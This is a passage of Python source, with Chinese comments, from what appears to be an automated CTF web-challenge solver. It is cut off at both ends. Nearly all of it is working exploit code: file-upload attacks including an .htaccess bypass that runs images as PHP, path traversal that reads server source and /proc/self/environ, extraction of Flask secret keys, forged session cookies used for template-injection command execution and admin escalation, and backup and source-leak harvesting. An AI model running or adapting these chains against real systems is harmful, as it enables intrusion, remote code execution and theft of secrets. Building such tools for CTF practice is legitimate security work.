            elif isinstance(o, list):
                for v in o:
                    _walk(v)
        _walk(j)
    except Exception:
        pass
    return saved


def test_upload(ctx, fp, stop_on_flag=True):
    if not ctx.allow_upload:
        ctx.log("[deep] 已关闭上传测试")
        return []
    results = []
    jobs = [f for f in (fp.get("forms") or []) if f["files"]]
    if not jobs:
        ctx.log("[deep] 页面上没有发现文件上传表单")
        return results
    for form in jobs[:2]:
        field = form["files"][0]
        lfi_attempts = 0
        for base, ext, content, ctype, label in UPLOAD_CASES:
            token_name = base + ctx.token + ext
            fields = {k: v for k, v in form["fields"].items() if k != field}
            item = ctx.post_multipart(form["action"], fields, field, token_name, content, ctype,
                                      referer=ctx.url)
            if item.get("status") == 0:
                # 靶场 WAF / 内容检查常在收到载荷时直接断连，隔一次再试才好区
                # 分"偶发断连"与"这个载荷被拦"。
                time.sleep(2.0)
                item = ctx.post_multipart(form["action"], fields, field, token_name, content, ctype,
                                          referer=ctx.url)
            if item.get("status") == 0:
                ctx.add("upload-blocked", form["action"], payload=token_name,
                        evidence="%s 上传被重置连接（疑似 WAF/内容检查拦截）：%s"
                                 % (label, str(item.get("error"))[:80]), confidence="low")
                results.append({"filename": token_name, "blocked": True, "kind": label})
                ctx.log("[deep] 上传 %s（%s）被拦截（HTTP 0），跳过探测" % (label, token_name))
                continue
            code = item.get("status")
            ctx.log("[deep] 上传 %s（%s）→ HTTP %s%s"
                    % (label, token_name, code,
                       ("｜" + str(item.get("error"))[:80]) if item.get("error") else ""))
            if code not in (200, 201, 204, 301, 302):
                # 4xx/5xx 就是服务端明确拒绝这个载荷，根本不会有文件落盘。
                # 现场 N1BOOK「unsecure converter」每个载荷都回 400，而旧代码只把
                # status==0 当拦截，于是每种载荷都要再花 8~14 个请求去找不存在的路径，
                # 9 种载荷白烧 100 多个请求——这也是「强网杯 Upload 预算耗尽」的一部分。
                ctx.add("upload-rejected", form["action"], payload=token_name,
                        evidence="%s 被服务端拒绝（HTTP %s），未落盘" % (label, code),
                        confidence="low")
                results.append({"filename": token_name, "rejected": code, "kind": label})
                continue
            text = text_of(item)
            saved = _upload_urls_from_response(text, token_name)
            cands = []
            for s in saved:
                u = urljoin(form["action"], s.lstrip("./"))
                if _same_origin(ctx.url, u):
                    cands.append(u)
            for d in UPLOAD_DIRS:
                cands.append(ctx.root.rstrip("/") + "/" + d + "/" + token_name)
            cands.append(ctx.root.rstrip("/") + "/" + token_name)
            seen = set()
            hit = ""
            for u in cands[:8]:
                if u in seen:
                    continue
                seen.add(u)
                got = ctx.get(u, referer=form["action"])
                body = text_of(got)
                if UPLOAD_MARK in body and "<?php" not in body and "<%=" not in body:
                    ctx.add("upload-exec", u, payload=token_name,
                            evidence="%s 上传后可访问并执行（回显 %s）" % (label, UPLOAD_MARK))
                    results.append({"url": u, "filename": token_name, "exec": True, "form": form["action"],
                                    "kind": label, "ctype": ctype})
                    hit = "可执行"
                    break
                if UPLOAD_MARK in body:
                    ctx.add("upload-stored", u, payload=token_name,
                            evidence="%s 已上传但按源码返回（未解析）" % label, confidence="medium")
                    results.append({"url": u, "filename": token_name, "exec": False, "form": form["action"],
                                    "kind": label, "ctype": ctype})
                    hit = "已存储未解析"
                    break
            if hit:
                ctx.log("[deep] 上传 %s 结论：%s" % (token_name, hit))
                if hit == "可执行":
                    _read_flag_via_upload(ctx, form, field, u, ctype)
                    if ctx.flags and stop_on_flag:
                        # flag 优先：上传点已取到 flag，不再跑剩余载荷形态
                        ctx.log("[deep] 上传已取到 flag，停止后续上传形态")
                        return results
            else:
                ctx.log("[deep] 上传 %s 后 8 个候选路径均未回显标记" % token_name)
                u2, exec2 = upload_relocate(ctx, form, token_name, text)
                if u2:
                    fname = u2.rsplit("/", 1)[-1]
                    ctx.log("[deep] 目录反查到实际存储文件 %s" % fname)
                    if exec2:
                        ctx.add("upload-exec", u2, payload=token_name,
                                evidence="%s 上传后被改名为 %s，仍可访问并执行（回显 %s）"
                                         % (label, fname, UPLOAD_MARK))
                        results.append({"url": u2, "filename": fname, "exec": True,
                                        "form": form["action"], "kind": label, "ctype": ctype})
                        _read_flag_via_upload(ctx, form, field, u2, ctype)
                        if ctx.flags and stop_on_flag:
                            ctx.log("[deep] 上传已取到 flag，停止后续上传形态")
                            return results
                    else:
                        ctx.add("upload-stored", u2, payload=token_name,
                                evidence="反查到的 %s 按源码返回（未解析）" % fname, confidence="medium")
                        results.append({"url": u2, "filename": fname, "exec": False,
                                        "form": form["action"], "kind": label, "ctype": ctype})
                # 跨阶段联动：上传已 2xx 但直接访问不执行时，把落盘路径交给页面源码
                # 里抽出的文件包含参数。源码名/JS 参数名都没有时不盲试，省下预算。
                if lfi_attempts < 2 and not ctx.flags and (
                        fp.get("src_get") or fp.get("js_params")):
                    lfi_attempts += 1
                    if upload_lfi_chain(ctx, fp, form, field, token_name, text,
                                        results, ctype, label):
                        if ctx.flags and stop_on_flag:
                            ctx.log("[deep] 上传×包含联动已取到 flag，停止后续载荷形态")
                            return results
        if not any(r.get("exec") for r in results):
            _try_htaccess(ctx, form, field, results)
    return results


HTACCESS_BODY = (b"AddType application/x-httpd-php .jpg\n"
                 b"AddHandler application/x-httpd-php .jpg\n")


def _try_htaccess(ctx, form, field, results):
    """.htaccess 绕过：先把 .jpg 映射成 PHP，再传伪装成图片的脚本。"""
    fields = {k: v for k, v in form["fields"].items() if k != field}
    name1 = ".htaccess"
    r1 = ctx.post_multipart(form["action"], fields, field, name1, HTACCESS_BODY, "text/plain",
                            referer=ctx.url)
    ctx.log("[deep] .htaccess 上传 → HTTP %s" % r1.get("status"))
    if r1.get("status") != 200:
        return
    base = "ht" + ctx.token
    name2 = base + ".jpg"
    r2 = ctx.post_multipart(form["action"], fields, field, name2,
                            b"<?php echo 'CTFBOXUPLOAD9137'; ?>", "image/jpeg",
                            referer=ctx.url)
    ctx.log("[deep] .htaccess 生效后上传 %s → HTTP %s" % (name2, r2.get("status")))
    if r2.get("status") != 200:
        return
    for d in UPLOAD_DIRS + [""]:
        u = ctx.root.rstrip("/") + "/" + (d + "/" if d else "") + name2
        got = ctx.get(u, referer=form["action"])
        body = text_of(got)
        if UPLOAD_MARK in body:
            ctx.add("upload-exec", u, payload=name2,
                    evidence=".htaccess 把 .jpg 解析成 PHP，脚本已执行（回显 %s）" % UPLOAD_MARK)
            results.append({"url": u, "filename": name2, "exec": True, "form": form["action"],
                            "kind": ".htaccess + .jpg", "ctype": "image/jpeg"})
            ctx.log("[deep] .htaccess 绕过成功：%s" % u)
            _read_flag_via_upload(ctx, form, field, u, "image/jpeg")
            return


def _read_flag_via_upload(ctx, form, field, exec_url, ctype="application/x-php"):
    """上传点确认可执行后，再放一个只读固定路径的取 flag 脚本。

    载荷没有参数、不接受命令、不建会话，只按固定清单读几个 flag 位置；
    目的是把"能执行"变成"能拿到 flag"，而不是拿一个可交互的 shell。
    ctype 要沿用已经通过校验的那种（MIME 校验题会拒掉 application/x-php）。
    """
    name = "read" + ctx.token + ".php"
    fields = {k: v for k, v in form["fields"].items() if k != field}
    item = ctx.post_multipart(form["action"], fields, field, name, FLAG_READER_PHP,
                              ctype, referer=ctx.url)
    if item.get("status") == 0:
        ctx.log("[deep] 取 flag 脚本上传被拦截（HTTP 0），改用人工读取")
        return
    target = exec_url.rsplit("/", 1)[0] + "/" + name
    got = ctx.get(target, referer=form["action"])
    if got.get("status") != 200:
        # 改名题：取 flag 脚本同样会被重命名，用同一套反查逻辑找回真实名字
        u2, _exec2 = upload_relocate(ctx, form, name, text_of(item))
        if not u2:
            ctx.log("[deep] 取 flag 脚本访问失败（HTTP %s），沿用原 Content-Type 仍被拒" % got.get("status"))
            return
        ctx.log("[deep] 取 flag 脚本被改名为 %s" % u2.rsplit("/", 1)[-1])
        target = u2
        got = ctx.get(target, referer=form["action"])
    flags = collect_flags(text_of(got))
    if flags:
        for flag in flags:
            ctx._add_flag(flag, target)
        ctx.add("flag-read", target, payload=name,
                evidence="上传点执行取 flag 脚本，命中 " + flags[0][:40])
    else:
        ctx.log("[deep] 取 flag 脚本已执行，但固定路径里没有 flag（可能路径不同，需人工确认）")


# ---------------------------------------------------------------------------
# Flask 源码泄露 → 伪造 session → SSTI（afr_3 类题）
# ---------------------------------------------------------------------------
FLASK_ENDPOINTS = (("/article", "name"), ("/read", "file"), ("/view", "page"),
                   ("/page", "p"), ("/file", "file"), ("/download", "file"),
                   ("/show", "name"))
FLASK_LEAK_FILES = ("proc/self/cwd/server.py", "proc/self/cwd/app.py",
                    "proc/self/cwd/main.py", "proc/self/cwd/key.py",
                    "proc/self/cwd/flag.py", "proc/self/cmdline",
                    "proc/self/environ")


def _flask_hint(ctx, fp):
    """只有页面/会话露出 Flask 特征时才走这条重链，避免在普通题上浪费预算。"""
    for c in ctx.jar:
        try:
            if session_mod.is_signed_session(c.value):
                return True
        except Exception:
            pass
    blob = ((fp.get("small") or "") + " " + " ".join(fp.get("tech") or [])).lower()
    for key in ("n1 page", "n1code", "n1page", "flask", "jinja", "article?name"):
        if key in blob:
            return True
    fields = [k.lower() for f in (fp.get("forms") or []) for k in (f.get("fields") or {})]
    return any(k in fields for k in ("n1code", "code", "tpl", "template"))


def _flask_add_entry(ctx, out, seen, url):
    if not url or not _same_origin(ctx.url, url):
        return
    parts = urlsplit(url)
    for name, _value in parse_qsl(parts.query, keep_blank_values=True)[:3]:
        key = (parts.path, name)
        if key in seen:
            continue
        seen.add(key)
        out.append((url, name))


def _flask_discover_entries(ctx, fp):
    """找 `?name=` 这类文件读取入口。

    afr_3 的 /article?name= 链接只在 POST /n1page 之后的响应里出现，首页 HTML
    和首页链接里都没有，所以必须把表单提交一次再从响应里抽链接。
    """
    out, seen = [], set()
    _flask_add_entry(ctx, out, seen, fp.get("final_url") or ctx.url)
    for link in (fp.get("links") or []) + (fp.get("js_links") or []):
        _flask_add_entry(ctx, out, seen, link)
    for form in fp.get("forms") or []:
        if form.get("method") == "GET" and form.get("fields"):
            field = next(iter(form["fields"]))
            _flask_add_entry(ctx, out, seen,
                             form["action"] + "?" + field + "=article")
    # POST 一次普通表单，从响应里抽 /article?name=...；这是 afr_3 的入口线索来源
    for form in (fp.get("forms") or [])[:2]:
        if form.get("method") != "POST" or form.get("files"):
            continue
        fields = {k: "1" for k in (form.get("fields") or {})}
        try:
            resp = ctx.post_form(form["action"], fields)
        except Exception:
            continue
        body = text_of(resp)
        for link in parse_links(body, resp.get("final_url") or form["action"]):
            _flask_add_entry(ctx, out, seen, link)
        for mo in re.finditer(r"""(?i)(/[A-Za-z0-9_\-/]{1,40}\?(?:name|file|page|p|path|filename)=[^\s"'<>&]*)[^\s"'<>]*""", body):
            _flask_add_entry(ctx, out, seen, urljoin(ctx.root, html.unescape(mo.group(1))))
    if not out:
        # 已知题型的短名单，命中一个就够；不做全字典扫描
        for path, param in FLASK_ENDPOINTS:
            _flask_add_entry(ctx, out, seen,
                             ctx.root.rstrip("/") + path + "?" + param + "=article")
    return out[:8]


def _py_source_score(text):
    low = (text or "").lower()
    if not low or len(low) > 300000:
        return 0
    if "<html" in low and "import " not in low and "@app.route" not in low:
        return 0
    marks = ("import ", "from ", "@app.route", "render_template", "secret_key",
             "execfile", "app.run", "def ", "flask")
    return sum(1 for m in marks if m in low)


def _flask_read(ctx, base_url, param, payload):
    return ctx.get(_set_param(base_url, param, payload))


def _flask_extract_secret(sources):
    """从源码里抽 Flask secret_key：直接赋值 > key 变量 > key.py 引号串。"""
    cands = []

    def add(v):
        v = (v or "").strip()
        if 3 <= len(v) <= 120 and v not in cands:
            cands.append(v)

    for name, txt in sources.items():
        for mo in re.finditer(
                r"""(?i)(?:app\s*\.\s*)?(?:SECRET_KEY|secret_key)\s*=\s*(['"])([^'"]{3,120})\1""",
                txt):
            add(mo.group(2))
    for name in ("key.py", "server.py", "app.py", "main.py"):
        txt = sources.get(name, "")
        for mo in re.finditer(r"""(?i)^\s*([A-Za-z_]\w*)\s*=\s*(['"])([^'"]{3,120})\2""",
                              txt, re.M):
            var, val = mo.group(1), mo.group(3)
            if name == "key.py" or "key" in var.lower() or "secret" in var.lower():
                add(val)
    # 还有一层：源码里任意长引号串（有些题 key 直接写在 config 字典里）
    for txt in sources.values():
        for mo in re.finditer(r"""(['"])([A-Za-z0-9_\-]{12,80})\1""", txt):
            add(mo.group(2))
    return cands[:8]


def _flask_session_key(sources, fp):
    keys = []
    for txt in sources.values():
        for mo in re.finditer(r"""session\s*(?:\[|\.get\()\s*['"]([^'"]{1,40})['"]""", txt):
            if mo.group(1) not in keys:
                keys.append(mo.group(1))
    if keys:
        return keys[0]
    for form in fp.get("forms") or []:
        for name in (form.get("fields") or {}):
            if name.lower() in ("n1code", "code", "tpl", "template", "name"):
                return name
    return "n1code"


def _flask_trigger(ctx, fp, sources):
    for form in fp.get("forms") or []:
        if form.get("method") == "POST" and not form.get("files"):
            field = next(iter(form.get("fields") or {}), "n1code")
            return form["action"], field, True
    # 源码里找 render_template_string 所在路由
    for txt in sources.values():
        mo = re.search(r"""(?is)@\w+\.route\(\s*['"]([^'"]+)['"][^)]*\)\s*def\s+\w+.*?render_template_string""", txt)
        if mo:
            return urljoin(ctx.root.rstrip("/") + "/", mo.group(1).lstrip("/")), "n1code", True
    return ctx.url, "n1code", False


def _itsdangerous_ts():
    n = int(time.time())
    raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _flask_forge(ctx, trigger, field, secret, sess_key, template, hash_name, method, is_post):
    cookie = session_mod.sign({sess_key: template}, secret, _itsdangerous_ts(),
                              hash_name=hash_name, method=method)
    ctx.set_cookie("session", cookie)
    if is_post:
        return ctx.post_form(trigger, {field: "1"})
    return ctx.get(_set_param(trigger, field, "1"))


def flask_source_chain(ctx, fp):
    """LFI 读源码 → 抽 secret_key → 伪造 Flask session → SSTI → 读 flag。"""
    entries = _flask_discover_entries(ctx, fp)
    if not entries:
        return False
    for url, param in entries[:6]:
        if ctx.budget.used + 20 >= ctx.budget.max_requests:
            return False
        base = ctx.get(_set_param(url, param, "article"))
        base_text = text_of(base)
        if base.get("status") != 200 or ctx.is_soft(base_text) or len(base_text) < 3:
            continue
        depth, sources = None, {}
        probes = ["../" * d + "proc/self/cwd/server.py" for d in (3, 2, 1, 4, 5, 6)]
        probes += ["/proc/self/cwd/server.py", "server.py", "../server.py"]
        for payload in probes:
            item = _flask_read(ctx, url, param, payload)
            txt = text_of(item)
            if _py_source_score(txt) >= 2:
                depth, sources["server.py"] = payload.count("../"), txt
                ctx.add("flask-source", item["url"], payload=payload,
                        evidence="读取到 server.py 源码 %d 字节" % len(txt))
                ctx.log("[deep] Flask 源码读取成立：?%s=%s" % (param, payload))
                break
        if not sources:
            continue
        # 同一穿越深度继续读 key/flag/运行环境
        prefix = "../" * depth
        for name in FLASK_LEAK_FILES:
            if ctx.budget.used + 8 >= ctx.budget.max_requests:
                break
            short = name.rsplit("/", 1)[-1]
            if short in sources:
                continue
            payload = prefix + name if not name.startswith("/") else name
            item = _flask_read(ctx, url, param, payload)
            txt = text_of(item)
            if item.get("status") != 200 or ctx.is_soft(txt) or len(txt) > 200000:
                continue
            if "<html" in txt.lower() and "<script" in txt.lower():
                continue
            sources[short] = txt
            if collect_flags(txt):
                ctx.add("flag-read", item["url"], payload=payload,
                        evidence="源码/运行环境里直接读到 flag")
                return True
        key_file = sources.get("key.py", "")
        # 确认它真的是 key 文件，而不是把 404 页当源码
        if key_file and not re.search(r"""(?i)(['"])[^'"]{6,}\1""", key_file):
            sources.pop("key.py", None)
        secret = _flask_extract_secret(sources)
        if not secret:
            continue
        trigger, field, is_post = _flask_trigger(ctx, fp, sources)
        sess_key = _flask_session_key(sources, fp)
        # 先用现有 session Cookie 反推签名参数（hash/method），能省掉 3/4 的尝试
        combos = [("sha1", "hmac"), ("sha1", "django-concat"),
                  ("sha256", "hmac"), ("sha1", "concat")]
        for c in list(ctx.jar):
            if c.name != "session" or not session_mod.is_signed_session(c.value):
                continue
            hit = session_mod.crack(c.value, secret)
            if hit:
                _sec, hash_name, method, _obj = hit
                combos = [(hash_name, method)]
                break
        confirmed = None
        for sec in secret[:4]:
            for hash_name, method in combos:
                item = _flask_forge(ctx, trigger, field, sec, sess_key,
                                    "{{191*7919}}", hash_name, method, is_post)
                if "1512529" not in text_of(item):
                    continue
                item2 = _flask_forge(ctx, trigger, field, sec, sess_key,
                                     "{{192*7919}}", hash_name, method, is_post)
                if "1520448" in text_of(item2):
                    confirmed = (sec, hash_name, method)
                    ctx.add("flask-session-ssti", trigger,
                            payload="session[%r]={{191*7919}}（%s/%s）"
                                    % (sess_key, hash_name, method),
                            evidence="伪造 session 后模板被求值：1512529 / 1520448")
                    ctx.log("[deep] Flask session 伪造成功：secret=%r %s/%s"
                            % (sec, hash_name, method))
                    break
            if confirmed:
                break
        if not confirmed:
            continue
        sec, hash_name, method = confirmed
        cmds = ["cat flag.py", "cat /flag* 2>/dev/null; cat flag.py 2>/dev/null; "
                "cat ../flag.py 2>/dev/null; cat /flag 2>/dev/null"]
        for cmd in cmds:
            for _label, tpl in SSTI_RCE_TPL[:3]:
                if ctx.budget.used + 3 >= ctx.budget.max_requests:
                    break
                payload = tpl % cmd
                item = _flask_forge(ctx, trigger, field, sec, sess_key, payload,
                                    hash_name, method, is_post)
                flags = collect_flags(text_of(item))
                if flags:
                    for flag in flags:
                        ctx._add_flag(flag, trigger)
                    ctx.add("flag-read", trigger, payload=payload[:140],
                            evidence="伪造 session 的 SSTI 执行 `%s` 读到 flag" % cmd)
                    return True
        return bool(ctx.flags)
    return False


def leaked_secret_chain(ctx, fp):
    """泄露的 SECRET_KEY → 校验签名参数 → 伪造提权 session → 取 flag。

    v4.1 新增：与 flask_source_chain 互补。后者必须先用 LFI 读到 server.py 才能
    拿到密钥，而 N1BOOK「Encrypted Flask」把密钥直接放在 robots.txt 声明的
    /static/secretkey.txt 里、页面既无参数也无表单，旧版只能记一条 robots-leak
    线索就收手。这里不依赖 LFI：拿泄露内容反推/枚举签名参数，把原 session 的
    字段提权（或补 admin 字段）后重签名，再带上 Cookie 访问首页与 JS 接口。
    """
    secrets = list(dict.fromkeys(ctx.leaked_secrets or []))[:6]
    if not secrets:
        return False
    cur = ""
    for c in list(ctx.jar):
        if c.name == "session" and session_mod.is_signed_session(c.value):
            cur = c.value
            break
    if cur:
        hit = session_mod.crack(cur, secrets)
        if not hit:
            return False
        sec, hash_name, method, base_obj = hit
        combos = [(sec, hash_name, method)]
        ts = cur.split(".")[1]
        ctx.log("[deep] 泄露密钥命中现有 session 签名：%r %s/%s"
                % (sec[:40], hash_name, method))
    else:
        base_obj = {}
        ts = _itsdangerous_ts()
        combos = [(s, h, m) for s in secrets[:3]
                  for h, m in (("sha1", "django-concat"), ("sha1", "hmac"),
                               ("sha256", "hmac"), ("sha1", "concat"))]
    payloads = []
    if isinstance(base_obj, dict):
        for key in list(base_obj)[:4]:
            for up in (True, "admin", 1):
                p = dict(base_obj)
                if p.get(key) == up:
                    continue
                p[key] = up
                payloads.append(p)
        for extra in ({"admin": True}, {"is_admin": True}, {"role": "admin"},
                      {"username": "admin"}, {"user": "admin"}):
            p = dict(base_obj)
            p.update(extra)
            payloads.append(p)
    uniq, seen = [], set()
    for p in payloads:
        k = json.dumps(p, sort_keys=True, default=str)
        if k not in seen:
            seen.add(k)
            uniq.append(p)
    uniq = uniq[:12] if len(combos) == 1 else uniq[:4]
    urls = []
    for u in ([fp.get("final_url") or ctx.url] + list(fp.get("js_endpoints") or [])[:2]
              + [ctx.root.rstrip("/") + "/admin", ctx.root.rstrip("/") + "/flag"]):
        if u and _same_origin(ctx.url, u) and u not in urls:
            urls.append(u)
    urls = urls[:4]
    base_text = text_of(ctx.get(ctx.url))
    budget_left = max(0, ctx.budget.max_requests - ctx.budget.used)
    tries = min(budget_left - 4, len(uniq) * len(combos) * len(urls))
    if tries <= 0:
        return False
    done = 0
    for payload in uniq:
        for sec, hash_name, method in combos:
            if done >= tries:
                return bool(ctx.flags)
            cookie = session_mod.sign(payload, sec, ts, hash_name, method)
            ctx.set_cookie("session", cookie)
            before = len(ctx.flags)
            for u in urls:
                if done >= tries:
                    break
                item = ctx.get(u)
                done += 1
                body = text_of(item)
                if len(ctx.flags) > before:
                    ctx.add("session-priv-esc", u, payload=cookie[:80],
                            evidence="用泄露的 SECRET_KEY 重签名 session（%s/%s）后取到 flag"
                                     % (hash_name, method))
                    return True
                if re.search(r"(?i)(logout|退出登录|admin panel|welcome admin)", body) \
                        and abs(len(body) - len(base_text)) > 60:
                    ctx.add("session-priv-esc", u, payload=cookie[:80],
                            evidence="泄露密钥重签名后页面出现管理员态（尚未直接给出 flag）",
                            confidence="medium")
                    break
    return bool(ctx.flags)


# ---------------------------------------------------------------------------
# 定向 flag 读取与收尾
# ---------------------------------------------------------------------------
def test_nginx_alias(ctx):
    """nginx off-by-slash：location /img { alias /xxx/; } 缺尾斜杠时，
    /img../ 可穿越到上级目录列目录并读文件（N1BOOK afr_2 类题）。"""
    home = ctx.get(ctx.url)
    text = text_of(home)
    prefixes = set()
    for raw in re.findall(r"(?is)(?:src|href)\s*=\s*[\"']([^\"']+)", text):
        link = urljoin(ctx.url, raw)
        if not _same_origin(ctx.url, link):
            continue
        path = urlsplit(link).path
        if "/" in path.strip("/"):
            prefixes.add(path.rsplit("/", 1)[0])
    for item in ctx.seen_urls:
        path = urlsplit(item["url"]).path
        if "/" in path.strip("/"):
            prefixes.add(path.rsplit("/", 1)[0])
    for prefix in sorted(prefixes)[:6]:
        if not prefix or prefix.endswith((".php", ".html", ".js", ".css")):
            continue
        base = ctx.root.rstrip("/") + prefix + "../"
        item = ctx.get(base)
        body = text_of(item)
        if item.get("status") != 200 or ctx.is_soft(body):
            continue
        if "Index of" not in body and "href=" not in body.lower():
            continue
        ctx.add("nginx-alias", base, evidence="off-by-slash 穿越列出上级目录",
                confidence="high")
        ctx.log("[deep] nginx off-by-slash：%s 可列上级目录" % base)
        for name in ("flag", "flag.txt", "flag.php", "f1ag.txt", "FLAG.txt"):
            got = ctx.get(base + name)
            if collect_flags(text_of(got)):
                return True
        for raw in re.findall(r"(?is)href\s*=\s*[\"']([^\"']+)", body)[:40]:
            tail = raw.rstrip("/").rsplit("/", 1)[-1]
            if "flag" in tail.lower() and not raw.startswith(("http", "/", "..")):
                got = ctx.get(base + raw)
                if collect_flags(text_of(got)):
                    return True
    return bool(ctx.flags)


def flag_hunt(ctx):
    """不依赖漏洞的直接读取：常见 flag 路径 + 备用备份名。"""
    for path in ("flag.txt", "flag", "flag.php", "FLAG.txt", "f1ag.txt", "flag.txt.bak"):
        item = ctx.get(ctx.root.rstrip("/") + "/" + path)
        text = text_of(item)
        if item.get("status") == 200 and ctx.is_soft(text):
            ctx.log("[deep] 直读 /%s 命中 soft-404，跳过" % path)
            continue
        if item.get("status") == 200:
            ctx.log("[deep] 直读 /%s -> 200（%d 字节）" % (path, len(item.get("body") or b"")))
        if collect_flags(text):
            return
    # robots / sitemap 里可能直接写着 flag 目录，也可能写着"真正入口"的路径
    for path in ("robots.txt", "sitemap.xml"):
        item = ctx.get(ctx.root.rstrip("/") + "/" + path)
        body = text_of(item)
        for flag in collect_flags(body):
            ctx._add_flag(flag, item["url"])
        for rp in robots_paths(body):
            u = urljoin(ctx.root.rstrip("/") + "/", rp.lstrip("/"))
            if not _same_origin(ctx.url, u) or u in ctx.robots_urls:
                continue
            ctx.robots_urls.append(u)
            if item.get("status") != 200:
                continue
            got = ctx.get(u)
            txt = text_of(got)
            if got.get("status") == 200 and not ctx.is_soft(txt):
                ctx.add("robots-leak", u, payload="robots.txt",
                        evidence="robots.txt 声明的路径可直接访问（%d 字节）"
                                 % len(got.get("body") or b""), confidence="medium")
                _remember_leak(ctx, u, txt)
                for flag in collect_flags(txt):
                    ctx._add_flag(flag, u)


def _remember_leak(ctx, url, text):
    """把泄露文件里的短文本留作密钥/口令候选。

    现场 N1BOOK「Encrypted Flask」的 /static/secretkey.txt 是 20 字节的
    Flask SECRET_KEY；旧版只在 finding 里记了「文件可访问」，内容没进任何
    解题链，于是密钥摆在眼前却仍伪造不了 session。
    """
    raw = (text or "").strip()
    if not raw or len(raw) > 4096 or "<html" in raw.lower():
        return
    cands = []
    whole = raw.strip().strip("'\"")
    if 3 <= len(whole) <= 128 and "\n" not in whole and re.fullmatch(r"[ -~]+", whole):
        cands.append(whole)
    for mo in re.finditer(r"""(?im)^\s*(?:secret(?:_key)?|key|token|password|passwd|pwd|api[_-]?key)\s*[:=]\s*['"]?([^'"\r\n\s]{3,128})""", raw):
        cands.append(mo.group(1))
    for c in cands:
        if c not in ctx.leaked_secrets:
            ctx.leaked_secrets.append(c)
            ctx.log("[deep] 泄露内容回灌候选 %r（%s）" % (c[:60], url.rsplit("/", 1)[-1]))


def robots_paths(text):
    """取 robots.txt / sitemap 里声明的路径（Disallow/Allow 都是出题人给的提示）。"""
    out = []
    for mo in re.finditer(r"(?im)^\s*(?:dis)?allow\s*:\s*([^\s#]+)", text or ""):
        p = mo.group(1).strip()
        if p and p != "/" and len(p) <= 90 and p not in out:
            out.append(p)
    for mo in re.finditer(r"(?is)<loc>\s*([^<\s]{2,90})\s*</loc>", text or ""):
        p = mo.group(1).strip()
        if p.startswith("/") and p not in out:
            out.append(p)
    return out[:10]


def dir_crawl(ctx, max_pages=60, depth=3):
    """只读目录遍历：从根开始跟目录链接（以 / 结尾或能打开成列表页），
    文件名含 flag 的一律取回；命中 flag 即停。应对"目录遍历/目录扫描"类题。"""
    seen = set()
    queue = [(ctx.root, 0)]
    # robots.txt 里声明的目录直接进队列：出题人写在 Disallow 下的路径就是提示
    for u in ctx.robots_urls[:6]:
        if "." not in u.rsplit("/", 1)[-1]:
            queue.append((u, 0))
    pages = 0
    while queue and pages < max_pages:
        url, lvl = queue.pop(0)
        if url in seen or not _same_origin(ctx.url, url):
            continue
        seen.add(url)
        item = ctx.get(url)
        pages += 1
        text = text_of(item)
        if item.get("status") == 404:
            continue
        # 目录列表特征：有 href 且不是纯静态首页
        hrefs = re.findall(r"(?is)href\s*=\s*(\"[^\"]*\"|'[^']*')", text)
        if lvl == 0 and not any(h.strip("\"'").endswith("/") for h in hrefs):
            continue
        ctx.add("dir-listing", url, evidence="目录可列出（%d 个链接）" % len(hrefs),
                confidence="medium")
        for raw in hrefs[:40]:
            href = raw.strip("\"'")
            link = urljoin(url, href)
            if not _same_origin(ctx.url, link) or link.startswith("javascript"):
                continue
            tail = link.rstrip("/").rsplit("/", 1)[-1]
            if href.endswith("/") and lvl + 1 <= depth:
                if link not in seen:
                    queue.append((link, lvl + 1))
                continue
            if "flag" in tail.lower() and tail:
                got = ctx.get(link)
                if collect_flags(text_of(got)):
                    ctx.log("[deep] 目录遍历命中 flag 文件：%s" % link)
                    return True
        if lvl == 0 and item.get("status") == 200 and not hrefs:
            continue
    return bool(ctx.flags)


DS_JUNK = ("bud1", "dsdb", "bwsi", "icns", "icnc", "dddf", "wcmm", "lcmm", "fmla",
           "cmiteminfo", "buddyinfo", "dscl", "dsd1", "names", "longnames", "shortnames",
           "comments", "iconb", "iconk", "picky", "tree", "root", "settings",
           "applications", "desktop", "documents", "downloads", "library", "pictures",
           "public", "music", "system", "usr", "var", "tmp")


def ds_store_names(body):
    """从 .DS_Store 里抠出文件名。

    这里的坑是编码：macOS 的 names 块把文件名存成 UTF-16BE（`\\x00i\\x00n\\x00d`），
    只按 ASCII 连续串去匹配的话，一整份 .DS_Store 里能捞到的基本只有结尾的 `DSDB`
    和块头 `Bud1` 这些结构标签——现场 N1BOOK「死亡ping命令」就是这个结果，
    看起来像"解析成功但没内容"。所以 ASCII 与 UTF-16 两种都要读，
    再把结构标签剔掉，并让带扩展名的（真正可能是脚本/文件的）排在前面。
    """
    import re
    out = []

    def add(name):
        name = (name or "").strip().strip("\x00")
        if len(name) < 3 or len(name) > 120:
            return
        if any(c in name for c in "\r\n\t/\\ "):
            return
        if name.lower() in DS_JUNK:
            return
        if name not in out:
            out.append(name)

    for raw in re.findall(rb"[ -~]{3,}", body):
        add(raw.decode("latin-1", "ignore"))
    # UTF-16 两种字节序都试，取「带扩展名的名字更多」的那一侧。
    # 同一份文件只会用一种字节序，另一种也能匹配上，但会错位半个字符，
    # 捞出 `flag_is_here.tx`、`tDSDB` 这种拼出来的假名字浪费后续请求。
    scored = []
    for pat, enc in ((rb"(?:\x00[ -~]){2,}", "utf-16-be"), (rb"(?:[ -~]\x00){2,}", "utf-16-le")):
        names = []
        for raw in re.findall(pat, body):
            try:
                nm = raw.decode(enc, "ignore").strip("\x00")
            except Exception:
                continue
            if nm:
                names.append(nm)
        scored.append((sum(1 for n in names if "." in n), names))
    best = max(scored, key=lambda s: s[0]) if scored else (0, [])
    for nm in best[1]:
        add(nm)
    # 去掉被更长名字包含的碎片（错位匹配留下的尾巴）
    out = [n for n in out if not any(n != o and n in o for o in out)]
    out.sort(key=lambda n: 0 if "." in n else 1)
    return out


def vim_swap_text(body):
    """vim swap 里保存的是原文件全文，按可打印串还原（够用来找 flag）。"""
    import re
    parts = [raw.decode("latin-1", "ignore") for raw in re.findall(rb"[ -~\t\r\n]{8,}", body)]
    return "\n".join(parts)


def backup_hunt(ctx):
    """备份/源码泄露：拉常见站点备份与 .git 索引，压缩包内直接找 flag。只读下载。"""
    import io, zipfile
    names = ["www.zip", "www.tar.gz", "www.tar", "backup.zip", "web.zip", "html.zip",
             "wwwroot.zip", "src.zip", "source.zip", "site.zip", "www.rar",
             "index.php.bak", "index.php~", "index.php.swp", ".index.php.swp",
             "www.bak", "web.rar", "backup.rar", "db.sql", "database.sql",
             ".DS_Store", ".svn/entries", "WEB-INF/web.xml"]
    def soft_404(body):
